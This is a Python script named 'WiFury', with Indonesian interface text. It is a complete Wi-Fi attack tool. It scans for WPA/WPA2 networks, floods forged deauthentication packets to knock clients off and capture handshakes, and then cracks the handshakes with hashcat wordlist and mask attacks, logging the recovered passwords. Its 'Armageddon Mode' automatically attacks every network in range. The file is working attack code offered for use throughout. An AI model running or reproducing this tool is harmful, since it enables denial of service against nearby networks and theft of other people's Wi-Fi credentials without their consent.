#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
import json
import random
import string
import csv
import signal
from datetime import datetime
from scapy.all import *

# --- Rich Library untuk Tampilan Keren ---
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.prompt import Prompt, Confirm

# Inisialisasi Console Rich
console = Console()

# --- Konfigurasi dan Tema Warna ---
class Theme:
    BANNER = "bold cyan"
    SUCCESS = "bold green"
    ERROR = "bold red"
    WARNING = "bold yellow"
    INFO = "bold blue"
    RESET = "white"

# --- Banner Ganas v12.0 ---
def display_banner():
    banner_text = """
    ██     ██ ██ ██ ███████ ██    ██ ██    ██ ██████   
    ██     ██ ██ ██ ██      ██    ██ ██    ██ ██   ██  
    ██  █  ██ ██ ██ █████   ██    ██ ██    ██ ██████   
    ██ ███ ██ ██ ██ ██       ██  ██  ██    ██ ██   ██  
     ███ ███   ██  ███████   ████   ███████  ██████ 
    """
    panel = Panel.fit(
        f"[bold blue]{banner_text}[/bold blue]\n"
        f"           [white]'The Finisher' - Battle Tested[/white]\n",
        title="[bold red]WiFury[/bold red]",
        border_style="red"
    )
    console.print(panel)

# --- Kelas Utama WiFury ---
class WiFury:
    def __init__(self):
        self.config_file = "wifury_config.json"
        self.learn_file = "wifury_learned.json"
        self.results_file = "cracked.txt"
        self.config = self.load_config()
        self.learned_data = self.load_learned_data()
        self.interface = None
        self.mon_interface = None
        self.session_dir = self.create_session_dir()
        self.networks = {}

    def create_session_dir(self):
        now = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
        dir_name = f"wifury_session_{now}"
        os.makedirs(dir_name, exist_ok=True)
        console.print(f"[*] Sesi kerja disimpan di: [cyan]{dir_name}[/cyan]", style=Theme.INFO)
        return dir_name

    def load_config(self):
        defaults = {"default_interface": "wlan0"}
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, "r") as f: config = json.load(f)
                if "interface" in config: config["default_interface"] = config.pop("interface")
                defaults.update(config)
            except (json.JSONDecodeError, TypeError):
                console.print("[!] File konfigurasi rusak, membuat yang baru.", style=Theme.WARNING)
        with open(self.config_file, "w") as f: json.dump(defaults, f, indent=4)
        return defaults

    def load_learned_data(self):
        if os.path.exists(self.learn_file):
            with open(self.learn_file, "r") as f: return json.load(f)
        return {"patterns": [], "success_rates": {}}

    def save_learned_data(self):
        with open(self.learn_file, "w") as f: json.dump(self.learned_data, f, indent=4)
            
    def save_result(self, essid, bssid, password):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        result_line = f"[{timestamp}] ESSID: {essid} | BSSID: {bssid} | Password: {password}\n"
        with open(self.results_file, "a") as f: f.write(result_line)
        console.print(f"[+] Hasil berhasil disimpan di [bold cyan]{self.results_file}[/bold cyan]", style=Theme.SUCCESS)

    def check_dependencies(self):
        console.print("[*] Memeriksa dependensi...", style=Theme.INFO)
        tools = ["airmon-ng", "airodump-ng", "hashcat", "cap2hccapx"]
        all_found = True
        for tool in tools:
            if subprocess.call(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                console.print(f"[!] Tool '{tool}' tidak ditemukan. Mohon install.", style=Theme.ERROR); all_found = False
        if not all_found: sys.exit(1)
        console.print("[+] Semua dependensi ditemukan.", style=Theme.SUCCESS)

    def enable_monitor_mode(self):
        self.interface = console.input(f"Masukkan nama interface [{self.config['default_interface']}]: ") or self.config['default_interface']
        console.print(f"[*] Mengaktifkan monitor mode pada [cyan]{self.interface}[/cyan]...", style=Theme.INFO)
        try:
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, check=False)
            result = subprocess.run(["airmon-ng", "start", self.interface], capture_output=True, text=True, check=True)
            self.mon_interface = None
            for line in result.stdout.split('\n'):
                if "monitor mode enabled on" in line: self.mon_interface = line.split(" on ")[1].split(')')[0]; break
            if not self.mon_interface: self.mon_interface = f"{self.interface}mon"
            console.print(f"[+] Monitor mode aktif pada [cyan]{self.mon_interface}[/cyan].", style=Theme.SUCCESS)
        except subprocess.CalledProcessError as e:
            console.print(f"[!] Gagal mengaktifkan monitor mode: {e.stderr}", style=Theme.ERROR); sys.exit(1)

    def disable_monitor_mode(self):
        if self.mon_interface:
            console.print(f"\n[*] Menonaktifkan monitor mode...", style=Theme.INFO)
            subprocess.run(["airmon-ng", "stop", self.mon_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            console.print("[+] Monitor mode dinonaktifkan.", style=Theme.SUCCESS)

    def smart_scan(self):
        scan_duration = 30
        console.print(f"[*] Memulai Smart Scan Otomatis selama [bold cyan]{scan_duration} detik[/bold cyan]...", style=Theme.INFO)
        scan_prefix = os.path.join(self.session_dir, "scan")
        scan_cmd = ["airodump-ng", "--output-format", "csv", "-w", scan_prefix, self.mon_interface]
        proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),transient=True) as progress:
            task = progress.add_task(f"[green]Scanning...", total=scan_duration)
            for _ in range(scan_duration): time.sleep(1); progress.update(task, advance=1)
        proc.send_signal(signal.SIGINT)
        try: proc.wait(timeout=10)
        except subprocess.TimeoutExpired: proc.terminate()
        console.print("[+] Scan selesai.", style=Theme.SUCCESS)
        scan_file = f"{scan_prefix}-01.csv"
        if not os.path.exists(scan_file) or os.path.getsize(scan_file) < 50:
            console.print("[!] File hasil scan kosong.", style=Theme.ERROR); return
        self.networks.clear()
        with open(scan_file, 'r', newline='', errors='ignore') as f:
            reader = list(csv.reader(f)); client_section_start = len(reader)
            for i, row in enumerate(reader):
                if row and "Station MAC" in row[0]: client_section_start = i; break
            ap_lines = [row for i, row in enumerate(reader) if 1 < i < client_section_start and row]
            for row in ap_lines:
                if len(row) > 13:
                    bssid, essid, encryption = row[0].strip(), row[13].strip(), row[5].strip()
                    if essid and essid != "<length: 0>" and "WPA" in encryption:
                        self.networks[bssid] = {"ESSID": essid, "Channel": row[3].strip(), "Signal": row[8].strip()}
        table = Table(title="[bold]Jaringan WiFi (WPA/WPA2) Ditemukan[/bold]")
        table.add_column("No", style="cyan"); table.add_column("ESSID", style="magenta"); table.add_column("BSSID", style="yellow"); table.add_column("Channel", style="green"); table.add_column("Signal", style="red")
        if not self.networks: console.print("[yellow]Tidak ada jaringan WPA/WPA2 ditemukan.[/yellow]"); return
        for i, (bssid, info) in enumerate(self.networks.items(), 1):
            table.add_row(str(i), info['ESSID'], bssid, info['Channel'], info['Signal'])
        console.print(table)

    def generate_smart_wordlist(self, essid, size=50000):
        console.print(f"[*] Membuat wordlist cerdas untuk [cyan]{essid}[/cyan]...", style=Theme.INFO)
        wordlist_path = os.path.join(self.session_dir, f"ai_wordlist_{essid}.txt")
        wordlist = set()
        base_words = [essid, essid.lower(), essid.upper(), essid.capitalize()] + self.learned_data.get("patterns", [])
        symbols = "!@#$%^&*"
        years = [str(i) for i in range(2000, datetime.now().year + 2)]
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), transient=True) as progress:
            task = progress.add_task(f"[green]Generating {size} passwords...", total=size)
            while len(wordlist) < size:
                base = random.choice(base_words)
                if random.random() > 0.5: base += random.choice(years)
                if random.random() > 0.3: base += ''.join(random.choices(string.digits, k=random.randint(2, 4)))
                if random.random() > 0.6: base += random.choice(symbols)
                wordlist.add(base)
                progress.update(task, completed=len(wordlist))
        with open(wordlist_path, "w") as f: f.write("\n".join(wordlist))
        console.print(f"[+] Wordlist dengan [bold]{len(wordlist)}[/bold] password disimpan di [cyan]{wordlist_path}[/cyan]", style=Theme.SUCCESS)
        return wordlist_path

    def capture_handshake(self, bssid, channel):
        console.print(f"[*] Menangkap handshake untuk [cyan]{bssid}[/cyan]...", style=Theme.INFO)
        def deauth_attack():
            pkt=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
            # PERBAIKAN: Deauth lebih brutal
            sendp(pkt,iface=self.mon_interface,count=300,inter=0.1,verbose=0)
            
        capture_prefix=os.path.join(self.session_dir,f"handshake_{bssid.replace(':','')}")
        capture_cmd=["airodump-ng","-c",channel,"--bssid",bssid,"-w",capture_prefix,self.mon_interface]
        proc=subprocess.Popen(capture_cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        handshake_found=False; cap_file=f"{capture_prefix}-01.cap"
        
        # PERBAIKAN: Waktu capture lebih sabar
        with Progress(SpinnerColumn(),TextColumn("[progress.description]{task.description}"),transient=True) as progress:
            task=progress.add_task("[yellow]Menunggu WPA Handshake...",total=20)
            for _ in range(20): # Coba selama ~40 detik
                threading.Thread(target=deauth_attack).start()
                time.sleep(2); progress.update(task,advance=1)
                if os.path.exists(cap_file):
                    # PERBAIKAN: Lebih toleran terhadap error decode
                    result=subprocess.run(["aircrack-ng",cap_file],capture_output=True,text=True, errors='ignore')
                    if"1 handshake"in result.stdout or"WPA (1 handshake)"in result.stdout: handshake_found=True; break
                    
        proc.send_signal(signal.SIGINT)
        try: proc.wait(timeout=5)
        except subprocess.TimeoutExpired: proc.terminate()
        
        if handshake_found:
            console.print(f"[+] Handshake berhasil ditangkap!", style=Theme.SUCCESS)
            return cap_file
        else:
            console.print(f"[!] Gagal menangkap handshake (mungkin tidak lengkap).", style=Theme.ERROR)
            return None

    def ask_mask_details(self):
        console.print(Panel("[bold]Mari kita bangun serangan Brute-Force (Mask) yang cerdas.", title="[yellow]Mode Interaktif[/yellow]"))
        try:
            len_range = console.input("[?] Perkiraan panjang password (misal: 8, atau 8-10): ")
            min_len, max_len = 8, 8
            if "-" in len_range: min_len, max_len = int(len_range.split("-")[0]), int(len_range.split("-")[1])
            else: min_len = max_len = int(len_range)
        except (ValueError, IndexError):
            console.print("[!] Format salah. Harap masukkan angka atau rentang angka (misal: 8-10).", style=Theme.ERROR); return None
        charset = ""
        if console.input("[?] Mengandung [green]huruf kecil[/green] (a,b,c..)? [y/n]: ").lower() == 'y': charset += "?l"
        if console.input("[?] Mengandung [green]huruf besar[/green] (A,B,C..)? [y/n]: ").lower() == 'y': charset += "?u"
        if console.input("[?] Mengandung [green]angka[/green] (1,2,3..)? [y/n]: ").lower() == 'y': charset += "?d"
        if console.input("[?] Mengandung [green]simbol[/green] (!,@,#..)? [y/n]: ").lower() == 'y': charset += "?s"
        if not charset: console.print("[!] Pilih minimal satu jenis karakter.", style=Theme.ERROR); return None
        return [charset * length for length in range(min_len, max_len + 1)]

    def hybrid_crack(self, cap_file, essid, bssid, interactive=True):
        console.print(f"[*] Memulai Hybrid Crack pada [cyan]{essid}[/cyan]...", style=Theme.INFO)
        hccapx_file = os.path.join(self.session_dir, f"{bssid.replace(':','')}.hccapx")
        try: subprocess.run(["cap2hccapx", cap_file, hccapx_file], check=True, capture_output=True)
        except subprocess.CalledProcessError: console.print("[!] Gagal konversi .cap.", style=Theme.ERROR); return None
        
        # Cek apakah file hccapx benar-benar berisi hash
        check_hash = subprocess.run(['hashcat', '-m', '22000', '--potfile-disable', '--left', hccapx_file], capture_output=True, text=True, errors='ignore')
        if not check_hash.stdout.strip():
            console.print(f"[!] File handshake [yellow]{os.path.basename(hccapx_file)}[/yellow] tidak mengandung hash yang valid.", style=Theme.ERROR)
            return None

        HASH_MODE = "22000"
        show_cmd = ["hashcat", "-m", HASH_MODE, hccapx_file, "--show"]
        
        wordlist_path = self.generate_smart_wordlist(essid)
        console.print(f"[*] Tahap 1: Serangan wordlist...", style=Theme.INFO)
        subprocess.run(["hashcat","-m",HASH_MODE,hccapx_file,wordlist_path,"--force","--potfile-disable"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cracked_result = subprocess.run(show_cmd, capture_output=True, text=True, errors='ignore')
        if cracked_result.stdout.strip():
            password = cracked_result.stdout.strip().split(":")[-1]
            console.print(f"[+] [bold]Ditemukan (Wordlist):[/bold] [green]{password}[/green]", style=Theme.SUCCESS)
            self.save_result(essid, bssid, password); self.learned_data["patterns"].append(password); self.save_learned_data()
            return password

        console.print("[!] Wordlist gagal, lanjut ke serangan mask.", style=Theme.WARNING)
        if interactive: masks_to_try = self.ask_mask_details()
        else:
            console.print("[*] Mode non-interaktif, mencoba mask default (8-10 digit angka)...", style=Theme.INFO)
            masks_to_try = ["?d?d?d?d?d?d?d?d", "?d?d?d?d?d?d?d?d?d", "?d?d?d?d?d?d?d?d?d?d"]
        if not masks_to_try: return None

        for i, mask in enumerate(masks_to_try):
            console.print(f"[*] Tahap 2.{i+1}: Mencoba mask [cyan]({mask})[/cyan]...", style=Theme.INFO)
            subprocess.run(["hashcat","-m",HASH_MODE,"-a","3",hccapx_file,mask,"--force","--potfile-disable"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cracked_result_mask = subprocess.run(show_cmd, capture_output=True, text=True, errors='ignore')
            if cracked_result_mask.stdout.strip():
                password = cracked_result_mask.stdout.strip().split(":")[-1]
                console.print(f"[+] [bold]Ditemukan (Mask):[/bold] [green]{password}[/green]", style=Theme.SUCCESS)
                self.save_result(essid, bssid, password); self.learned_data["patterns"].append(password); self.save_learned_data()
                return password
        return None

    def armageddon_mode(self):
        console.print(Panel("[bold red]ARMAGEDDON MODE DIAKTIFKAN[/bold red]", subtitle="Menyerang semua target terdeteksi..."))
        self.smart_scan()
        if not self.networks: console.print("[!] Tidak ada target untuk diserang.", style=Theme.WARNING); return
        results = {}
        total_targets = len(self.networks)
        for i, (bssid, info) in enumerate(self.networks.items()):
            console.print(Panel(f"Menyerang Target {i+1}/{total_targets}", title=f"[cyan]{info['ESSID']}[/cyan]"))
            cap_file = self.capture_handshake(bssid, info['Channel'])
            if not cap_file:
                results[bssid] = {"essid": info['ESSID'], "status": "[red]Handshake Gagal[/red]", "password": "-"}; continue
            password = self.hybrid_crack(cap_file, info['ESSID'], bssid, interactive=False)
            if password: results[bssid] = {"essid": info['ESSID'], "status": "[green]Berhasil Di-crack[/green]", "password": password}
            else: results[bssid] = {"essid": info['ESSID'], "status": "[yellow]Crack Gagal[/yellow]", "password": "-"}
        console.print(Panel("[bold]LAPORAN MISI ARMAGEDDON[/bold]", subtitle="Hasil dari semua serangan"))
        report_table = Table(title="[bold]Laporan Akhir[/bold]")
        report_table.add_column("ESSID", style="magenta"); report_table.add_column("BSSID", style="yellow"); report_table.add_column("Status", style="cyan"); report_table.add_column("Password Ditemukan", style="green")
        for bssid, result in results.items():
            report_table.add_row(result['essid'], bssid, result['status'], result['password'])
        console.print(report_table)

    def run(self):
        display_banner()
        self.check_dependencies()
        self.enable_monitor_mode()
        while True:
            console.print(Panel.fit("1. [cyan]Smart Scan[/cyan]\n2. [cyan]Hybrid Crack (Single Target)[/cyan]\n3. [red]Armageddon Mode (Attack All)[/red]\n4. [white]Exit[/white]", title="[bold]Menu Utama[/bold]"))
            choice = console.input("Pilih opsi [1-4]: ")
            if choice == "1": self.smart_scan()
            elif choice == "2":
                if not self.networks: console.print("[!] Jalankan Smart Scan dulu.", style=Theme.WARNING); continue
                try:
                    target_num = int(console.input("[?] Masukkan nomor target: "))
                    if 1 <= target_num <= len(self.networks):
                        bssid = list(self.networks.keys())[target_num-1]
                        info = self.networks[bssid]
                        cap_file = self.capture_handshake(bssid, info['Channel'])
                        if cap_file: self.hybrid_crack(cap_file, info['ESSID'], bssid, interactive=True)
                    else: console.print("[!] Nomor target tidak valid.", style=Theme.ERROR)
                except ValueError: console.print("[!] Input tidak valid. Harap masukkan angka.", style=Theme.ERROR)
            elif choice == "3": self.armageddon_mode()
            elif choice == "4": break
            else: console.print("[!] Pilihan tidak valid.", style=Theme.ERROR)
        self.disable_monitor_mode()
        console.print("[*] Terima kasih telah menggunakan WiFury. Gaspol lagi kapan-kapan, Bosku!", style=Theme.INFO)

if __name__ == "__main__":
    if os.geteuid() != 0:
        console.print("[!] Script ini harus dijalankan dengan hak akses root (sudo).", style=Theme.ERROR); sys.exit(1)
    app = None
    try:
        os.system('clear')
        app = WiFury()
        app.run()
    except KeyboardInterrupt:
        console.print("\n[!] Program dihentikan oleh user.", style=Theme.WARNING)
        if app and app.mon_interface: app.disable_monitor_mode()
    except Exception as e:
        console.print(f"\n[!] Terjadi error tak terduga: {e}", style=Theme.ERROR)
        if app and app.mon_interface: app.disable_monitor_mode()
